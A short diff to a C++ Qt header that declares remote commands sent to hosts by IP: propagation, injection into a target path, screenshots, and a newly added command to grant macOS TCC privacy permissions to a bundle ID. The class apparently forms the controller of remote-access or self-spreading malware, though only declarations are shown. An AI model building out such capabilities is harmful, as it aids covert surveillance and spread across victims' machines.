@@ -38,6 +38,7 @@ public:
     void sendPropagationCommand(const QString& ip, uint8_t cmd, const QString& target);
     void sendInjectCommand(const QString& ip, const QString& targetPath);
     void sendScreenshotCommand(const QString& ip, uint8_t subtype = 1);
+    void sendTccGrantCommand(const QString& ip, const QString& bundleId);
 
     // Getters
     [[nodiscard]] bool     isRunning() const;
@@ -54,6 +55,8 @@ signals:
     void injectResultReceived(const QString& ip, bool success, const QString& targetPath);
     void screenshotReceived(const QString& ip, const QByteArray& jpeg,
                             int width, int height, bool success);
+    void tccGrantResultReceived(const QString& ip, const QString& bundleId,
+                                bool success);
     void statusMessage(const QString& message);
 
 private:
